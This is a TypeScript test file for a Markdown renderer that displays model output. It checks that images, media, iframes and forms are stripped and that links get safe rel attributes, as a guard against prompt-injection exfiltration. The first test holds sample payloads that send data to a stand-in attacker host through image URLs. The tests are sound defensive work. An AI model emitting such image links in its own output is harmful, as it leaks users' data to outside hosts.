import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import { renderMarkdown } from '../../../../src/ui/components/markdown/markdown.ts';

const purifier = createDOMPurify(new JSDOM('').window);
const parse = (markdown: string) => new JSDOM(renderMarkdown(markdown, purifier)).window.document;

describe('Given model output rendered as Markdown (prompt-injection exfiltration guard)', () => {
  it('When the output embeds an image Then no <img> remains so the browser sends no automatic request', () => {
    const document = parse('![](https://attacker.example/?data=secret)\n\n<img src="https://attacker.example/?d=1">');
    assert.equal(document.querySelector('img'), null);
    assert.doesNotMatch(document.body.innerHTML, /attacker\.example\/\?d/);
  });

  it('When the output has media or form markup Then picture, source, video, audio, iframe and form are removed', () => {
    const html = [
      '<picture><source srcset="https://a.example/x"><img src="https://a.example/y"></picture>',
      '<video src="https://a.example/v"></video><audio src="https://a.example/a"></audio>',
      '<iframe src="https://a.example/f"></iframe>',
      '<form action="https://a.example/post"><input name="q"></form>',
    ].join('\n\n');
    const document = parse(html);
    for (const tag of ['picture', 'source', 'video', 'audio', 'iframe', 'form']) {
      assert.equal(document.querySelector(tag), null, tag);
    }
  });

  it('When the output has a link Then it opens in a new tab with noopener noreferrer nofollow', () => {
    const anchor = parse('[출처](https://example.com/a)').querySelector('a')!;
    assert.equal(anchor.getAttribute('href'), 'https://example.com/a');
    assert.equal(anchor.getAttribute('target'), '_blank');
    assert.equal(anchor.getAttribute('rel'), 'noopener noreferrer nofollow');
  });

  it('When rendered repeatedly with one purifier Then the link attributes are applied each time without stacking hooks', () => {
    for (let i = 0; i < 3; i++) {
      assert.equal(parse('[a](https://example.com)').querySelector('a')!.getAttribute('rel'), 'noopener noreferrer nofollow');
    }
  });

  it('When normal Markdown is rendered Then bold, lists and code still work', () => {
    const document = parse('**굵게**\n\n- 하나\n- 둘\n\n```\ncode\n```');
    assert.equal(document.querySelector('strong')?.textContent, '굵게');
    assert.equal(document.querySelectorAll('li').length, 2);
    assert.equal(document.querySelector('pre code')?.textContent, 'code\n');
  });
});
